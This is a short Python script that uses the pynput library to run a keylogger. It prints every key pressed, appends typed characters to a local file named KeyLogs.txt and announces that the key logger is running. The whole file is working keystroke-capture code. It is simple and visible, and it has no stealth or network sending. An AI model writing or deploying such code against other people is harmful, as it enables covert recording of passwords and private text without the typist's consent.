import pynput

from pynput import keyboard

def KeyBoardPress(key):
    print(str(key))
    with open("KeyLogs.txt", 'a') as logKey:
        try:
            char= key.char
            logKey.write(char)
        except:
            print("Error getting the char!")


if __name__ == "__main__":
    print("Key logger is Currently Running")
    listener = keyboard.Listener(on_press= KeyBoardPress)
    listener.start()
    input()
